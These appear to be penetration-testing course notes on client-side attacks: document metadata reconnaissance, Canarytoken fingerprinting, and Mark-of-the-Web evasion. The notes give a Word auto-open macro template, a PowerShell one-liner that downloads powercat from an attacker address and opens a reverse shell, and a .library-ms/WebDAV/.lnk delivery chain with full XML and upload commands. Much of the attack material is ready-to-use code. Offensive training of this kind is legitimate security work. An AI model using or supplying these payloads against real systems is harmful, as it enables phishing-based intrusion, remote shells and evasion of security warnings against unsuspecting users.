
# Client-Side Attacks

## Traditional Attack Model
- Enumerate accessible machines and attempt to exploit exposed services.

---

## Target Reconnaissance

- Inspect metadata tags of publicly available documents associated with the target organization.
- Metadata includes author, creation date, name, and version of software or OS.
- Use `gobuster -x` to specify file extensions on a target's website (e.g., `.pdf`, `.txt`).

### Tools
- `exiftool`
  - `-a` to display duplicate tags.
  - `-u` to display unknown tags.

---

## Client Fingerprinting

- Goal: Obtain OS and browser info from a target in a non-routable internal network.

### Canarytokens
- Free web service to generate a tracking link with embedded token.
- When the target opens the link, it captures browser, IP, and OS info.
- You can choose token types and either enter an email or webhook URL for alerts.
- History view shows token accesses, including user agent strings.

### Notes
- Canarytokens can also be embedded in Word documents or PDFs.
- When the document is opened, the embedded image/token triggers.

---

## Exploiting Microsoft Office

### Preparation
- Email providers and spam filters often block raw `.doc` files.
- Use container formats like `.7z`, `.iso`, or `.img` to avoid MOTW (Mark-of-the-Web).
- FAT32 drives do not flag files with MOTW.

---

## Leveraging Microsoft Word Macros

### Notes
- `.doc` and `.docm` formats work.
- Choose "Current Document" in Macro dialog.

### Payload Template
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

### PowerShell Payload Example
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<myip>/powercat.ps1'); powercat -c <myip> -p 4444 -e powershell
```

If encoding is needed:
```python
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

---

## Obtaining Code Execution via Windows Library Files

### Concept
- `.library-ms` files are containers that connect users with remote data (e.g., WebDAV).
- Two-stage attack:
  1. Victim opens `.library-ms` pointing to WebDAV.
  2. WebDAV serves `.lnk` file that executes PowerShell payload.

### WebDAV Server Setup
```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
```

### Example Library File: `config.Library-ms`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://192.168.45.164</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### PowerShell Command for `.lnk`
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.164:8000/powercat.ps1'); powercat -c 192.168.45.164 -p 4444 -e powershell"
```

### Delivery Options
- Send `config.Library-ms` by email or upload to SMB share:
```bash
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```

- Remember: `.lnk` files get tagged with MOTW if opened in Explorer.

---

## Pro Tip

**Always check with `-x pdf,txt` in `gobuster`** even if port 80 returns 404.

